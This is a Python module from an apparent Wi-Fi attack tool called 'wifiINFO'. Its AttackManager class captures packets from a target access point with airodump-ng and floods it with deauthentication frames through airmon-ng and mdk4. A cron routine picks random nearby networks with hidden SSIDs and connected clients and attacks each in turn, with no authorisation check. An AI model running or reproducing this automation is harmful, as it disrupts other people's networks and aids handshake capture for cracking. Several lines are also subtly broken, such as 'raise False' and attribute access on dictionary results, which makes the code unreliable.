# -*- coding: utf-8 -*-
import importlib
import os
import signal
import sys
import time
import traceback
import subprocess
import random
import logging
import psutil

from wifiINFO.models import Activelog
from wifiINFO.common import settings as configer

logger = logging.getLogger("wifiINFO.attack")
importlib.reload(sys)


class AttackManager(object):
    def __init__(self, bssid=None, channel=None):

        if channel is not None:
            self.channel = channel
        else:
            if bssid is not None:
                try:
                    self.channel = Activelog.objects.get(bssid=bssid).channel
                except ValueError:
                    raise False
            else:
                self.channel = channel

        self.config = configer.ConfigManager()
        self.ATKFACE = self.config.get('ATKFACE')
        self.bssid = bssid

    def start_cron(self):
        self.config.set(ATK_STATUS=True)

    def stop_cron(self):
        self.config.set(ATK_STATUS=False)

    def dump(self, cwd="/opt/Wifi/WifiATK/packets/"):  # 此处硬编码

        if not os.path.exists(cwd):
            os.mkdir(cwd)

        try:
            process = subprocess.Popen([
                "airodump-ng",
                "--bssid",
                self.bssid,
                "--channel",
                self.channel,
                "-w",
                self.bssid,
                self.ATKFACE,
                "--output-format",
                "cap"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=False, cwd=cwd)

            self.config.set(DUMP_PID=process.pid, DUMP_BSSID=self.bssid)

            return process

        except RuntimeError:
            return False

    def stop_dump(self):
        pid = self.config.get('DUMP_PID')
        if isinstance(pid, str):
            pid = int(pid)

        try:
            if pid is not None and psutil.pid_exists(pid):
                os.kill(pid, signal.SIGKILL)

                self.config.set(DUMP_BSSID=None, DUMP_PID=None)
                return True
            else:
                return False

        except RuntimeError:
            return False

    def deauth(self):
        # Deauth
        try:
            subprocess.Popen([
                "airmon-ng",
                "start",
                self.ATKFACE,
                self.channel
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=False)
        except RuntimeError:
            return False

        try:
            process = subprocess.Popen([
                "mdk4",
                self.ATKFACE,
                "d",
                "-s",
                "20",
                "-c",
                str(self.channel),
                "-B",
                self.bssid
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=False)

            self.config.set(ATK_PID=process.pid, ATK_BSSID=self.bssid)
            return process
        except RuntimeError:
            return False

    def attack(self):

        if self.config.get('ATK_PID') is not None:
            return False

        process = self.deauth()
        return process

    def kill(self):
        """
                Choose a random Activelog object.
                :return: Activelog object.
                :rtype: object
                """
        try:
            pid = self.config.get('ATK_PID')
            if isinstance(pid, str):
                pid = int(pid)

                if psutil.pid_exists(pid):
                    os.kill(pid, signal.SIGKILL)

                self.config.set(ATK_PID=None, ATK_BSSID=None)
                return True
            else:
                return False
        except ValueError:
            print('No pid found!')
            return False

    def cron_atk(self):
        if self.config.get('MAIN_STATUS') == "False":
            return False

        if self.config.get('ATK_STATUS') == "False":
            return False

        self.random_target()
        process = self.attack()
        time.sleep(30)

        try:
            process.kill()
            return True
        except RuntimeError:
            print('\n', '>>>' * 20)
            print(traceback.print_exc())
            print('\n', '>>>' * 20)
            print(traceback.format_exc())
            return False

    # @staticmethod
    def random_target(self):
        """
        Choose a random Activelog object.
        :return: Activelog object.
        :rtype: object
        """
        try:
            no_essid_ap = Activelog.objects.filter(essid__isnull=True, client__isnull=False).values('bssid', 'channel')
            target = random.choice(no_essid_ap)

            self.bssid = target.bssid
            self.channel = target.channel

        except ConnectionError:
            print('\n', '>>>' * 20)
            print(traceback.print_exc())
            print('\n', '>>>' * 20)
            print(traceback.format_exc())
            return False
        return target
